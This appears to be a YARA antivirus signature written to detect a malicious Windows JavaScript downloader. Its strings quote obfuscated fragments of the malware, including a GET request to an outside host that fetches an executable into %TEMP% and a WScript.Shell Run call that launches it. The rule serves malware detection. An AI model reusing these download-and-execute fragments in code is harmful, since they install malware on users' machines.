rule sig_20160328_4d9e819ae0a19857906e380ceddecbcc {
  meta:
    description = "datamaliciousorder - file 20160328_4d9e819ae0a19857906e380ceddecbcc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f1413c29c6782392e013ec5cd51670e5b71aad9c22fdcd0de8441338e8bba374"

  strings:
    $s1  = "function Tdhzdgf() {return Oyrsjyoof[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"SqYK0GmlXnNr.exe\";};" fullword ascii
    $s2  = "do {WScript[Vbstwiy](Ryeygg() * 11)} while (Kyzynhtbr[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Oyrsjyoof = function Iydlt() {return WScript[Nswigs](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Kyzynhtbr[Tjydzr](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s5  = "function Mllvrkdqz(Kgpabekq, Quwdib){return Kgpabekq - Quwdib;};" fullword ascii
    $s6  = "function Cpwzazu() {return ((Ddkyokakw == true) && (Ddkyokakw == Tqfifednvn)) ? 1 : Szjfjhrqtz;};" fullword ascii
    $s7  = "function Hkvtnhba(Vxqtmevrkj){Oyrsjyoof[\"Run\"](Vxqtmevrkj, Szjfjhrqtz, Szjfjhrqtz);};" fullword ascii
    $s8  = "Tqfifednvn = true; " fullword ascii
    $s9  = "function Nuiktvcn(){return Aicpmhts;};" fullword ascii
    $s10 = "var Tqfifednvn = false;" fullword ascii
    $s11 = "function Sokkirah(Hiifa) {var Sckwyp = (1, 2, 3, 4, 5, Hiifa); return Sckwyp;};" fullword ascii
    $s12 = "var Dmzjm = new this[\"Date\"]();" fullword ascii
    $s13 = "function Ryeygg(){return 22;};" fullword ascii
    $s14 = "function Kwhaemmt()" fullword ascii
    $s15 = "return Mllvrkdqz(Bckzlbctj, Wbgxzdw);" fullword ascii
    $s16 = "Ddkyokakw = true; " fullword ascii
    $s17 = "var Ddkyokakw = false;" fullword ascii
    $s18 = "function Yhqmsjynkk(){return Nswigs;};" fullword ascii
    $s19 = " while (Nzajlo){" fullword ascii
    $s20 = "var Ikpgekv = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}